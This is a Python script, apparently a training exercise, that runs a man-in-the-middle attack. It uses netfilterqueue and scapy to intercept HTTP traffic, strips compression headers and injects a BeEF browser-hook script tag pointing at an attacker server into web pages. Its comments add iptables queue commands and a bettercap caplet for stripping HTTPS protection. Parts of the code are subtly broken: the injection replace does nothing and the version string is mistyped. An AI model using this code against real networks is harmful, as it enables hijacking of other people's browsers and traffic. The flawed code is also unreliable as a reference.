#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES RECEIVED FROM OTHER PCS
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES YOU'RE SENDING OUT LOCALLY
# iptables -I INPUT -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES YOU'RE RECEIVING LOCALLY
# iptables --flush # FLUSH THE IPTABLE WHEN YOU'RE DONE

# Some common commands when using beef:
# raw java files / spyder eye / redirect browser / alert / clippy

# Your local server is stored under ~/var/www/html
# You can run it with service apache2 start

# THESE ONLY WORK ON HTTP WEBSITES, NOT HTTPS!
# In order to use it on https websites, use bettercap -iface eth0 -caplet hstshijack/hstshijack
# When using bettercap, use INPUT/OUTPUT interfaces, not FORWARD

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    # Always delete len and chksum when altering packages
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# The HTML code is sent in the load part of the HTTP request, encoded in gzip (or other encoding for security)
# We can remove this to receive the data in plain text
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = str(scapy_packet[scapy.Raw].load)
            if scapy_packet[scapy.TCP].dport == 8080: # 8080 if HTTPS with bettercap, 80 if HTTP
                print("[+] Request")
                # Take everything from "Accept-Encoding" section until \r\n is met, then replace all of it with nothing
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP:1/0")

            elif scapy_packet[scapy.TCP].sport == 8080:
                print("[+] Response")
                injection_code = '<script src="http://192.168.18.139:3000/hook.js"></script>'
                load = load.replace("</body>", "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load) # You can separate regex
                # Why am I getting an "unnecessary non-capturing group" warning????

                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load: # If load has not changed, then change it.
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet)) # CHANGE HERE
        except UnicodeDecodeError:
            pass
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

